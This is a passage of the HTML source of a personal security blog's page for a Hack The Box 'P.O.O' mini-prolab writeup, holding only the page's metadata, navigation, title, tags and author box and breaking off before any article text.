<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  
    <title>P.O.O &middot; v1c70r_n00b&#39;$ Blog ⚔︎⛊</title>
    <meta name="title" content="P.O.O &middot; v1c70r_n00b&#39;$ Blog ⚔︎⛊">
  

  
  
    <meta name="description" content="Professional Offensive Operations">
  
  
    <meta name="keywords" content="HTB,Mini-prolab,Beginner,">
  
  
  
  <link rel="canonical" href="http://localhost:1313/posts/p.o.o/">
  

  
  
    <meta name="author" content="V1c70r_n00b">
  
  
    
      
        
          <link href="https://github.com/V1c70rn00b" rel="me">
        
      
    
      
        
          <link href="https://medium.com/@V1c70r_n00b" rel="me">
        
      
    
      
        
          <link href="https://twitter.com/v1c70r_n00b" rel="me">
        
      
    
  

  
  <meta property="og:url" content="http://localhost:1313/posts/p.o.o/">
  <meta property="og:site_name" content="v1c70r_n00b&#39;$ Blog ⚔︎⛊">
  <meta property="og:title" content="P.O.O">
  <meta property="og:description" content="A writeup on the P.O.O Prolab.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-10-07T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-10-07T00:00:00+00:00">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Mini-Prolab">
    <meta property="article:tag" content="Beginner">
    <meta property="og:image" content="http://localhost:1313/posts/p.o.o/featured.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/p.o.o/featured.png">
  <meta name="twitter:title" content="P.O.O">
  <meta name="twitter:description" content="A writeup on the P.O.O Prolab.">

  
  
  
  
    
      
    
  
    
  
    
  
  

  
  
  
  
  
  

  

  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.c3d5018081fbcdba89d02361054f16187fa7e39ebb6cec780e2736e95d7b6278cde2e3d98def3c20ae613a0b1098f5a9b11ad6320b21cc4a0bf8ec4ebc0b55cf.css"
    integrity="sha512-w9UBgIH7zbqJ0CNhBU8WGH&#43;n4567bOx4Dic26V17YnjN4uPZje88IK5hOgsQmPWpsRrWMgshzEoL&#43;OxOvAtVzw==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
  
  
  
  
  
  
    
    <script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js" integrity="sha512-tLci/LXULzT1KzCpLzUhtp9APKnZbQ1heetTfLhw9dg/3x/oNmiNldXJn&#43;&#43;9pBcEh3EQBuVgUfpn6gDaEFIXIQ=="></script>
  

  
  
  
    
  
  
    
  
  
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.e3d337dd3f18427eb20aa355839d583ef6382bc42e34cfe789adb9358d463ef51f53691e32f524259380d4d3add49162f522426784990f3a5dbd39c33c6ed05a.js"
      integrity="sha512-49M33T8YQn6yCqNVg51YPvY4K8QuNM/nia25NY1GPvUfU2keMvUkJZOA1NOt1JFi9SJCZ4SZDzpdvTnDPG7QWg=="
      data-copy="Copy"
      data-copied="Copied"></script>
  

  
  

<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>


























  

  

  

  

  





  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "P.O.O",
    "headline": "P.O.O",
    "description": "A writeup on the P.O.O Prolab.",
    "abstract": "Professional Offensive Operations",
    "inLanguage": "en",
    "url" : "http://localhost:1313/posts/p.o.o/",
    "author" : {
      "@type": "Person",
      "name": "V1c70r_n00b"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-10-07T00:00:00\u002b00:00",
    "datePublished": "2024-10-07T00:00:00\u002b00:00",
    
    "dateModified": "2024-10-07T00:00:00\u002b00:00",
    
    "keywords": ["HTB","Mini-prolab","Beginner"],
    
    "mainEntityOfPage": "true",
    "wordCount": "5660"
  }]
  </script>



  
  

  
  

  
  

  
  

  
  
</head>













  
    
  






  
  
  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 z-100">
  <div
    id="menu-blur"
    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
    













<div
  class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0">
  
  

  <div class="flex flex-1 items-center justify-between">
    <nav class="flex space-x-3">
      
        <a href="/" class="text-base font-medium">
          v1c70r_n00b&rsquo;$ Blog ⚔︎⛊
        </a>
      
    </nav>
    
  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
    
      
        
  <a
  href="/posts/"
  
  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
  aria-label="Blog"
  title="Posts">
  
  
    <p class="text-base font-medium">
      Blog
    </p>
  
</a>



      
        
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a
      
      aria-label="About"
      class="text-base font-medium hover:text-primary-600 dark:hover:text-primary-400"
      title="">
      <p>
        About
      </p>
    </a>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
          <a
            href="https://www.linkedin.com/in/victor-mwai/"
            
              target="_blank"
            
            aria-label="More about me"
            class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="">
              More about me
            </p>
          </a>
        
          <a
            href="/about/"
            
            aria-label="This is me"
            class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="Abouts">
              This is me
            </p>
          </a>
        
      </div>
    </div>
  </div>
</div>



      
        
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a
      
      aria-label="Resources"
      class="text-base font-medium hover:text-primary-600 dark:hover:text-primary-400"
      title="">
      <p>
        Resources
      </p>
    </a>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
          <a
            href="https://tryhackme.com"
            
              target="_blank"
            
            aria-label="TryHackMe"
            class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="">
              TryHackMe
            </p>
          </a>
        
          <a
            href="https://hackthebox.com/"
            
              target="_blank"
            
            aria-label="HTB"
            class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="">
              HTB
            </p>
          </a>
        
          <a
            href="https://lab.wifichallenge.com/"
            
              target="_blank"
            
            aria-label="WifiChallenge"
            class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="">
              WifiChallenge
            </p>
          </a>
        
          <a
            href="/resources/"
            
            aria-label="More Resources"
            class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="Resources">
              More Resources
            </p>
          </a>
        
      </div>
    </div>
  </div>
</div>



      
    

    

    

    
      <button
        id="search-button"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <div class=" flex items-center">
        <button
          id="appearance-switcher"
          aria-label="Dark mode switcher"
          type="button"
          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
          <div class="flex items-center justify-center dark:hidden">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
          </div>
          <div class="items-center justify-center hidden dark:flex">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
          </div>
        </button>
      </div>
    
  </nav>

    
  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
    <span></span>

    

    

    
      <button
        id="search-button-mobile"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <button
        id="appearance-switcher-mobile"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1">
        <div class="flex items-center justify-center dark:hidden">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
        </div>
        <div class="items-center justify-center hidden dark:flex">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
        </div>
      </button>
    
  </div>

  </div>
  
  <div class="-my-2 md:hidden">
    <div id="menu-button" class="block">
      
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
          <ul
            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
            <li id="menu-close-button">
              <span
                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
              </span>
            </li>

            
              
  <li class="mt-1">
  <a
    href="/posts/"
    
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
    aria-label="Blog"
    title="Posts">
    
    
      <p class="text-bg font-bg">
        Blog
      </p>
    
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href=""
    aria-label="About"
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      About
    </p>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </a>
</li>

  <li class="mt-1">
    <a
      href="https://www.linkedin.com/in/victor-mwai/"
      
        target="_blank"
      
      aria-label="More about me"
      class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="">
        More about me
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/about/"
      
      aria-label="This is me"
      class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="Abouts">
        This is me
      </p>
    </a>
  </li>

<li class="mb-2"></li>



            
              
  <li class="mt-1">
  <a
    href=""
    aria-label="Resources"
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      Resources
    </p>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </a>
</li>

  <li class="mt-1">
    <a
      href="https://tryhackme.com"
      
        target="_blank"
      
      aria-label="TryHackMe"
      class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="">
        TryHackMe
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="https://hackthebox.com/"
      
        target="_blank"
      
      aria-label="HTB"
      class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="">
        HTB
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="https://lab.wifichallenge.com/"
      
        target="_blank"
      
      aria-label="WifiChallenge"
      class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="">
        WifiChallenge
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/resources/"
      
      aria-label="More Resources"
      class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="Resources">
        More Resources
      </p>
    </a>
  </li>

<li class="mb-2"></li>



            

          </ul>
          
        </div>
      
    </div>
  </div>

</div>




  <script>
    (function () {
      var $mainmenu = $(".main-menu");
      var path = window.location.pathname;
      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
        $(e).children("p").addClass("active");
      });
    })();
  </script>


  </div>
</div>


<script
  type="text/javascript"
  src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
  integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
  data-blur-id="menu-blur"></script>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    
      
      
      
      
        







  
  
    
  
    
  
    
  
    
  






  
    
    
      
      
    
  





    <div id="hero" class="h-[150px] md:h-[200px]"></div>
  
  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
    
    
    
    <img
      id="background-image"
      src="/posts/p.o.o/featured_hu_a299f05afc67162c.png"
      alt="P.O.O"
      loading="eager"
      decoding="async"
      fetchpriority="high"
      class="absolute inset-0 w-full h-full object-cover"
      >
    <div
      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
    <div
      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
  </div>

  
    <div
      id="background-blur"
      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
    
    
    <script
      type="text/javascript"
      src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
      integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
      data-blur-id="background-blur"
      data-image-id="background-image"
      data-image-url="/posts/p.o.o/featured_hu_a299f05afc67162c.png"></script>
  
      
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
      >v1c70r_n00b&#39;$ Blog ⚔︎⛊</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/p.o.o/"
      >P.O.O</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        P.O.O
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  
    
  

  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2024-10-07T00:00:00&#43;00:00">7 October 2024</time><span class="px-2 text-primary-500">&middot;</span><span>5660 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">27 mins</span>
    

    
    
  </div>

  
    <div class="flex flex-row flex-wrap items-center">
      
        
          
        
      
        
      
        
      
        
      
    </div>
  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/ad/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    AD
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/prolabs/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Prolabs
  </span>
</span>

              </a>
            
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/htb/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    HTB
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/mini-prolab/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Mini-Prolab
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/beginner/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Beginner
  </span>
</span>

              </a>
            
          
        
      
    </div>
  

  
  



      </div>
      
        
  
  
  
  
  
  

  

  
    
    
<div class="flex author">
  
    
    
      
    
    
      
      
      
        
        
        
      
      <img
        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
        width="96"
        height="96"
        alt="V1c70r_n00b"
        src="/profile_hu_a48ded19aa968609.png"
        data-zoom-src="/profile_hu_796f091d1cbff0bc.png">
    
  
  <div class="place-self-center">
    
      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        V1c70r_n00b
      </div>
    
    
      <div class="text-sm text-neutral-700 dark:text-neutral-400"><p>Security Analyst || CTF player</p>
<p>Isaiah 6:8</p>
</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/V1c70rn00b"
          target="_blank"
          aria-label="Github"
          title="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://medium.com/@V1c70r_n00b"
          target="_blank"
          aria-label="Medium"
          title="Medium"
